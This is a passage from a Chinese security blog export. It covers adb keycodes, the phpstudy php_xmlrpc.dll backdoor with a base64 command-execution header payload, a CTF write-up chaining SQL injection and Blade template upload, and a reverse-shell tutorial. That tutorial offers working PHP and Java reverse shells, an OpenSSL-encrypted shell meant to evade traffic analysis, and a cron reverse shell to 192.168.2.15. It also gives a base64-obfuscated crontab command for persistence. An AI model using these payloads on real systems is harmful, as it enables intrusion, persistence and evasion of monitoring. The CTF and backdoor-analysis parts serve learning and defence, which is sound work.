<li>adb shell input keyevent <keycode><br>  keycode    含义<br>  3    HOME 键<br>  4    返回键<br>  5    打开拨号应用<br>  6    挂断电话<br>  24    增加音量<br>  25    降低音量<br>  26    电源键<br>  27    拍照（需要在相机应用里）<br>  64    打开浏览器<br>  82    菜单键<br>  85    播放&#x2F;暂停<br>  86    停止播放<br>  87    播放下一首<br>  88    播放上一首<br>  122    移动光标到行首或列表顶部<br>  123    移动光标到行末或列表底部<br>  126    恢复播放<br>  127    暂停播放<br>  164    静音<br>  176    打开系统设置<br>  187    切换应用<br>  207    打开联系人<br>  208    打开日历<br>  209    打开音乐<br>  210    打开计算器<br>  220    降低屏幕亮度<br>  221    提高屏幕亮度<br>  223    系统休眠<br>  224    点亮屏幕<br>  231    打开语音助手<br>  276    如果没有 wakelock 则让系统休眠</li>
</ul>
<p>刷机相关命令：<br>adb reboot recovery   &#x2F;&#x2F;重启到 Recovery 模式<br>adb reboot                 &#x2F;&#x2F;从 Recovery 重启到 Android<br>adb reboot bootloader  &#x2F;&#x2F;重启到 Fastboot 模式</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实adb还有很多姿势，我介绍的可能只是冰山一角吧。但是这些对于我来说已经够用了，而且远远满足我的工作需求，所以你如果和我一样只是做些测试工作，那么这些东西差不多够用，如果你想把它当玩具，最好还是去阅读下官方文档吧。</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>adb</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy后门事件</title>
    <url>//posts/phpstudy%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="phpstudy后门事件-gt-我的虚拟机中招了-😂"><a href="#phpstudy后门事件-gt-我的虚拟机中招了-😂" class="headerlink" title="phpstudy后门事件   -&gt;  我的虚拟机中招了 😂"></a>phpstudy后门事件   -&gt;  我的虚拟机中招了 😂</h2><p>最近，phpstudy 后门事件搞得风风火火的，然后我检查了自己的笔记本，发现没有中招，本来还高兴于自己的安全意识，因为我下载软件基本从官网下载。结果当我打开我的虚拟机的时候，发现这个版本和我自己用的版本不一致，于是我测试了一下，down，后门存在。虚拟机上也放了一丢丢的敏感文件，这次真的是有点尴尬了，赶紧删除对应版本。不给我平常用的都是7.0，所以问题也不算太大。看来以后下载东西真的要严格把关了。虚拟机上的这个我觉得是虚拟机就随便搞了一个进去，结果就中招了。</p>
<span id="more"></span>

<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>phpstudy2016-2018，php5.4.45 文件夹下的 php_xmlrpc.dll （我这里的还有php5.4.45 nts 这个文件下的php_xmlrpc.dll是没有后门的），另外网上都是说只有php5.4.45，结果我的虚拟机上的2018还发现5.2.17也存在。所以大家最好检查每个版本的php里面的php_xmlrpc.dll 文件<br>payload：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.37.10</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">55</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,en-US;q=<span class="number">0</span>.<span class="number">5</span>,en;q=<span class="number">0</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">accept</span>-charset: ZWNobyBzeXN0ZW0oIndob2FtaSIpOw==</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip,deflate</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>因为是加载的dll，所以这里随意请求个php文件都可以执行，所以还是很猛的。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我这里是phpstudy2018 打开 phpstudy2018\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>拖入IDA 字符串视图 直接搜索eval即可看到后门</p>
<p><img data-src="/images/1569296573066.png" alt="1569296573066"></p>
<p>如果你没有IDA也很简单，随便找个能看字符串的打开对应 php_xmlrpc.dll 搜索eval，比如linux：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings php_xmlrpc.dll | grep <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#回显：</span></span><br><span class="line">zend_eval_string</span><br><span class="line">@<span class="built_in">eval</span>(%s(<span class="string">&#x27;%s&#x27;</span>));</span><br><span class="line">%s;@<span class="built_in">eval</span>(%s(<span class="string">&#x27;%s&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>还想接着用就直接删除 php_xmlrpc.dll  当然最好是去官网下载没有后门的phpstudy。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>后门</tag>
        <tag>php-study</tag>
      </tags>
  </entry>
  <entry>
    <title>一道php代码审计题目的心路历程</title>
    <url>//posts/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：<br>1、遇到代码审计的题目从哪里入手才是正确的<br>2、做到哪里是难点，坚持不下去了，这时候应该怎么办<br>3、完全审计清楚，但是仍不会利用怎么办<br>旨在希望自己能真正的理解这些东西。<span id="more"></span></p>
<h2 id="源码地址-amp-amp-一些交代"><a href="#源码地址-amp-amp-一些交代" class="headerlink" title="源码地址&amp;&amp;一些交代"></a>源码地址&amp;&amp;一些交代</h2><p>源码地址：<a href="https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g">https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g</a><br>第一次看到题目发现无法入手，所以猜测肯定有相应的源码泄露（这是经验，没法传授。）通过dirb扫描发现备份文件 backup。然后下载进行分析。</p>
<h2 id="入手源码"><a href="#入手源码" class="headerlink" title="入手源码"></a>入手源码</h2><p>知识点1：查看是否是框架二次开发<br>拿到源码后首先看read.me发现是Laravel，如果没有readme可以去看配置文件和一些图片是否能发现是框架二次开发还是出题人自己写的php demo。</p>
<p>知识点2：快速了解框架<br>我们这里发现这个源码时基于Laravel开发的，而我也是从来没用过Laravel，所以马上去学习了一下，大概十几分钟，搞懂laravel的用处。主要通过简介和开发手册来进行学习，只要了解大概就行了。<br>我通过阅读官方手册目录大概了解了这个php框架：<br><a href="https://xueyuanjun.com/laravel-docs-5_6">https://xueyuanjun.com/laravel-docs-5_6</a></p>
<p>知识点3：漏洞点的查找<br>这时候你需要一个分析器，毕竟手动来搞太慢了，CTF是快者的世界。我用的是最老的那种seay源代码审计系统，不过还是挺好用的。<br>我通过这个审计工具发现：&#x2F;app&#x2F;Providers&#x2F;AppServiceProvider.php 18行 存在任意文件读取漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="title class_">\Blade</span>::<span class="title function_ invoke__">directive</span>(<span class="string">&#x27;filedata&#x27;</span>, function(<span class="variable">$expression</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;?php echo file_get_contents(<span class="subst">$expression</span>); ?&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//就是这里了 任意文件读取 但是这个东西是啥时候调用我们还不知道</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>知识点4：漫长的分析学习过程<br>通过漏洞点可知是一个任意文件读取，但是这个函数怎么调用我们不知道，而且对laravel也不太了解，所以我们搜索 —&gt;  laravel AppServiceProvider boot 方法如何调用<br>结果中显示 boot在register方法后调用，为了解决一些注册问题，反正对laravel也不太懂，先跳过，直接搜索 Blade::directivez 发现这个Blade是模板引擎，它可以进行模板的自定义，Blade::directive是进行指令注册，里面的参数就是指令名称，当blade模板渲染的时候对应指定如果存在就会被调用。所以这时候我想到的是模板注入调用指令filedata进行文件读取</p>
<p>但是无论怎么测试都没有模板注入点，所以可能是文件上传进行模板注入。于是我利用seay源码审计系统对upload进行了搜索。发现&#x2F;routes&#x2F;web.php 确实有一处上传点，不过需要key</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user_testpage/&#123;id&#125;&#x27;</span>, <span class="string">&#x27;UserController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Auth</span>::<span class="title function_ invoke__">routes</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/profile&#x27;</span>,<span class="string">&#x27;ProfileController@show&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;profile&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/uploadto_upload&#x27;</span>,<span class="string">&#x27;HomeController@uploads&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/home/uploadss/&#123;key&#125;&#x27;</span>,<span class="string">&#x27;HomeController@uploadss&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>key我找了好久没有找到，于是重新回到这个文件继续审查看看有没有新的发现。结果发现<br>文件还有一个路径 user_testpage&#x2F;{id}，构造一个 user_testpage&#x2F;1 发现有回显，立马意识到可能是sqli注入。<br>经过测试发现确实是sql注入在数据库查到所有用户密码，发现key就是第二个用户名NotAllow6171。<br>然后我们审查上传代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadss</span>(<span class="params">Request <span class="variable">$request</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$key</span>!=&lt;in database key&gt;)&#123;<span class="keyword">die</span>(<span class="string">&#x27;sorry!&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">isMethod</span>(<span class="string">&#x27;post&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">               <span class="variable">$originalName</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>(); <span class="comment">//文件原名</span></span><br><span class="line">               <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();     <span class="comment">//扩展名</span></span><br><span class="line">               <span class="variable">$realPath</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();  </span><br><span class="line">               <span class="variable">$type</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientMimeType</span>();</span><br><span class="line">               <span class="variable">$filecheck</span>=<span class="keyword">new</span> <span class="title class_">HomeController</span>();</span><br><span class="line">	        <span class="variable">$filecheck</span>-&gt;<span class="title function_ invoke__">filecheck</span>(<span class="variable">$realPath</span>);</span><br><span class="line">	        <span class="variable">$filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d-H-i-s&#x27;</span>) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">	        <span class="variable">$path</span>=<span class="variable">$file</span> -&gt; <span class="title function_ invoke__">move</span>(<span class="title function_ invoke__">base_path</span>().<span class="string">&#x27;/resources/views/auth/uploads&#x27;</span>,<span class="variable">$originalName</span>);  </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>审计后发现是上传到 &#x2F;resources&#x2F;views&#x2F;auth&#x2F;uploads 我们先进入目录查看其他php文件发现：函数调用就是直接    函数名+（“参数”） 于是我们构造 @filedata(‘&#x2F;flag’) 进行上传<br>构造上传，发现有CSRF 这个CSRF怎么过呢？再次查看routes&#x2F;web.php 发现还有另一处上传点，但是功能异常，所以我们通过这个上传点获得token来伪造一个上传数据包。那么数据包中应该是什么呢？肯定是要调用filedata 函数的 我们通过观察其他静态页面</p>
<p>最终payload:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home/uploadss/NotAllow6171</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>119.61.19.212:8085</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>444</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XSRF-TOKEN=eyJpdiI6IitoWjhwMm1ycmNTWFozSmZTTXJwXC9nPT0iLCJ2YWx1ZSI6IkllczhnNEZodldZbllTN0NmZDErR2I1eXF1bU9mV1wvYklManNuUnQ4YzhJcmlWQ09JVXJPXC9JNHZxVU0xRmdCY0RDbWJHelVwYjQyVjdXQ1FHVlFMMlE9PSIsIm1hYyI6IjNmMGUzZTEwYTA2ZDA2MjJjMDg4OTY5NTI4NDJjNTk2YmQ4N2U4NWYxY2E2ZjU3YWEwNTAwODllMzIyYTU4ZjAifQ%3D%3D; laravel_session=eyJpdiI6InRhRzZmenBJSmFLNHhrb0RlUE5OdVE9PSIsInZhbHVlIjoiZ01qK2JpQURoRHgxbFVrcGc4TE9PK2kycGxSTjlNRzkwK21uVDUxa3UyTW5JYXpIcWJaY2pYbXQwNDc0dklkemNjRmR0aFhZcllmTkRvQXpVUlR3d3c9PSIsIm1hYyI6IjAwMjVkODA3YmY5NDU1Y2U5MDMyMWMwMTI1MTcyMmQ1YTU5NWQzMTE0MGMxMzc0ZWM1NDU4YzQ5MWIyZjI5YTgifQ%3D%3D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;_token&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Z7VZ7FXfNzuzETtQrZ7DeAZCFtbkQl9L8e7ptVin</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;files&quot;; filename=&quot;template.blade.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@filedata(<span class="string">&#x27;/flag&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Submit</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFor</span></span></span><br><span class="line"><span class="language-pgsql">mBoundaryvJNe9ABsnjeKGhDN<span class="comment">--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>1、先搞懂框架、找到危险函数，也就是利用点，然后一条线分析下去。<br>2、遇到难点，审计不下去的时候，利用辅助工具，去查找一些敏感的函数 比如 login upload cookie sql语句等 也可以直接自动审计看看有什么思路。<br>3、完全审计清楚代码逻辑，但是不知道怎么利用的时候就多去百度对应函数，并百度对应框架的漏洞，参考别人的思路。仔细查看一些已经存在的文件。如果还是不知道如何利用那就是没看懂框架，再去跟一边正常功能的框架是如何实现的，函数是如何调用的！</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>关于反弹shell的那些事</title>
    <url>//posts/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个现实非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。</p>
<span id="more"></span>
<p>代码如下，改好ip+port运行即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure>
<p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock&#x3D;fsockopen(“10.0.0.1”,1234);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
<p>还有网上广泛的java反弹shell，但是在我测试的时候经常是失败的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<p>上面这种我测试经常是失败的，可能是版本不支持或者写法有问题吧，具体不太清楚。<br>也给大家推荐我常用的java的反弹shell:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// payload1</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>


<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
<ul>
<li>1 首先，vps上生成SSL证书的公私钥对<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
<li>2 在自己的VPS上监听反弹shell<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
<li>3 在目标上用openssl加密反弹shell的流量<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;<span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
你可以自己去抓包分析，对比加密反弹和常规反弹包，可以很清楚的知道加密的流量包是分析不出来我们执行了那些命令的。而且由于mkfifo 系统大多数系统自带，所以绝大多数都可以使用这种方式来反弹加密的shell流量。</li>
</ul>
<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。文件内容就是下面这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.2.15/9999  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>当然如果有webshell 也可以用cron反弹shell（维持权限）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHpPUzR4TURVdU9TNHhMems1T1RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0nIiB8Y3JvbnRhYiAt |base64 -d|bash -i&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>这个姿势还常用于awd中的权限维持，可以写好脚本从靶机直接进行flag的提交。另外对crontab不了解的同学可以去深入学习下crontab的结构和知识（很简单的）。</p>
<p>有时候在实战中经常发现用webshell进行shell反弹时会出现很多问题，但绝大多数都是编码的问题，这里记录下某次用jsp的命令执行进行的shell 反弹。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125; </span><br><span class="line">//这种可以解决编码问题，但是不能忽略<span class="built_in">base64</span>中的 + 号，这个也得编码。</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//java执行命令的小马一般用上述的反弹那 shell 方式</span><br><span class="line"></span><br><span class="line">bash -c <span class="string">&quot;bash -i .........&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)<br>直接上方法吧（不介绍第三方工具，因为大多数目标环境没有）：</p>
<ul>
<li>python实现的弱tty<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;	pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
为什么是一个弱tty呢 因为ctrl+c 仍可以中断，不过已经够用了 vi su 等等命令已经不是问题了。<br>它可以利用socat和nc来实现强tty不过目前感觉没啥用！感兴趣的去看下这篇文章:  <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br>目前还没发现比这个更好用的交互式shell的利用。以后有了再补充这块吧！</li>
</ul>
<h4 id="补充下windows-反弹shell"><a href="#补充下windows-反弹shell" class="headerlink" title="补充下windows 反弹shell"></a>补充下windows 反弹shell</h4><ul>
<li><ol>
<li>毫无疑问msf才是最适合windows反弹shell的工具</li>
</ol>
</li>
<li><ol start="2">
